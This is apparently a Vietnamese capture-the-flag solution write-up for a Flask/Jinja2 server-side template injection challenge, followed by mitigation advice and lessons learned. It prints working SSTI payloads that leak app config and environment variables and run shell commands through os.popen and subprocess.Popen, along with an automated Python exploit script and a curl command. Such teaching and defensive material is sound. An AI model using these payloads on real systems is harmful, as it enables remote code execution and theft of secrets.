# Thử thách 22: SSTIGreet — Giải pháp

## Loại lỗ hổng
**Server-Side Template Injection (SSTI - Lỗ hổng chèn Template phía máy chủ) — Jinja2**

## Mô tả
Endpoint `/render` truyền thẳng nội dung văn bản do người dùng nhập vào hàm `render_template_string()` của Flask. Hàm này biên dịch và thực thi input đó như một mẫu Jinja2 (Template), từ đó cấp cho kẻ tấn công toàn quyền truy cập vào bối cảnh (context) của mẫu và hệ thống phân cấp đối tượng (object hierarchy) của Python — bao gồm cả biến môi trường nơi Flag đang được cất giữ.

## Mã nguồn chứa lỗ hổng

```python
# app.py — /render route
user_template = request.form.get("template", "")
output = render_template_string(user_template)   # ← Dữ liệu user nhập bị thực thi như một template
```

Flag được lưu bên trong đối tượng config của Flask:
```python
app.config["FLAG"] = FLAG   # Có thể truy cập thông qua {{config['FLAG']}} trong template
```

## Khai thác (Exploit)

### Bước 1 — Xác nhận lỗi SSTI bằng phép thử toán học

Gửi đoạn mã sau vào hộp văn bản (text area):
```text
{{7*7}}
```
Nếu màn hình in ra kết quả là `49` → Lỗ hổng SSTI đã được xác nhận.

### Bước 2 — Trích xuất Flag (Cách đơn giản)

Flag nằm trong `app.config`:
```text
{{config['FLAG']}}
```

Hoặc trích xuất thông qua biến môi trường (environment variables):
```text
{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}
```

### Bước 3 — RCE toàn diện (Phần thưởng thêm — Không bắt buộc để lấy Flag)

Khai thác Thực thi mã từ xa (RCE) để chạy lệnh hệ thống:
```text
{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```
> Chỉ mục `439` tương ứng với lớp `subprocess.Popen` — con số này có thể thay đổi tùy thuộc vào phiên bản Python của server. Bạn nên liệt kê chúng trước bằng `.__subclasses__()`.

Hoặc dùng object `lipsum` (ngắn gọn hơn):
```text
{{lipsum.__globals__.os.popen('id').read()}}
```

## Khai thác tự động bằng Script Python

```python
import requests
import re

TARGET = "http://<host>:5000"

# Thử nghiệm nhanh
r = requests.post(f"{TARGET}/render", data={"template": "{{7*7}}"})
assert "49" in r.text, "Không kích hoạt được SSTI"
print("[+] Xác nhận có SSTI (7*7=49)")

# Trích xuất flag từ config
r = requests.post(f"{TARGET}/render", data={"template": "{{config['FLAG']}}"})
flag = re.search(r"FCTF\{[^}]+\}", r.text)
if flag:
    print(f"[+] Flag: {flag.group()}")
else:
    # Dự phòng: đọc từ biến môi trường os.environ
    payload = "{{request.application.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}"
    r = requests.post(f"{TARGET}/render", data={"template": payload})
    flag = re.search(r"FCTF\{[^}]+\}", r.text)
    print(f"[+] Flag (env): {flag.group() if flag else 'không tìm thấy'}")
```

### Khai thác qua cURL

```bash
curl -X POST http://<host>:5000/render \
  --data-urlencode "template={{config['FLAG']}}"
```

## Biện pháp phòng ngừa (Mitigation)

### Khắc phục: Không bao giờ render thẳng dữ liệu do người dùng nhập như một template

```python
# TRƯỚC KHI FIX (Chứa lỗ hổng)
output = render_template_string(user_template)

# SAU KHI FIX — Escape và chỉ hiển thị dưới dạng văn bản thuần
from markupsafe import escape
output = f"<pre>{escape(user_template)}</pre>"
```

Nếu bài toán thực sự bắt buộc người dùng phải viết template, hãy sử dụng **Môi trường Sandbox (Hộp cát)**:

```python
from jinja2.sandbox import SandboxedEnvironment

safe_env = SandboxedEnvironment()

def safe_render(user_template: str) -> str:
    try:
        return safe_env.from_string(user_template).render()
    except Exception as e:
        return f"Error: {e}"
```

Ngay cả khi đã dùng sandbox, tuyệt đối không được nhét các dữ liệu nhạy cảm (như `FLAG`) vào trong bối cảnh chung (context) của template.

## Cách hoạt động của cuộc tấn công

```text
render_template_string("Hello {{7*7}}")
         ↓
    Jinja2 phân tích và tính toán các khối {{ ... }}
         ↓
    "Hello 49"

render_template_string("{{config['FLAG']}}")
         ↓
    Biến config đại diện cho từ điển cấu hình app hiện tại của Flask
         ↓
    "FCTF{...}"    ← Lộ Flag!
```

## So sánh SSTI và XSS

| Tiêu chí | XSS | SSTI |
|---|---|---|
| Môi trường thực thi | Trình duyệt (Client) | Máy chủ (Backend Python/Jinja2) |
| Hậu quả | Đánh cắp cookie/phiên của user | RCE, Đọc/ghi file hệ thống, Đánh cắp dữ liệu |
| Payload kích hoạt | Các thẻ như `<script>` | Các khối template `{{ }}` / `{% %}` |

## Bài học rút ra
- SSTI mở ra cánh cửa dẫn tới việc thực thi mã **phía server** — rủi ro lớn hơn rất nhiều so với XSS.
- Hàm `render_template_string` của Flask chỉ được phép sử dụng cho các template đáng tin cậy đã định nghĩa sẵn, tuyệt đối không được dùng trực tiếp với dữ liệu mà người dùng nhập vào.
- Nên lưu trữ thông tin bí mật ở ngoài ngữ cảnh của template (đừng nhét `FLAG` vào `app.config` nếu ứng dụng có chức năng render template từ người dùng).
- Chỉ dùng `SandboxedEnvironment` khi tính năng cho phép user viết template thực sự cần thiết.
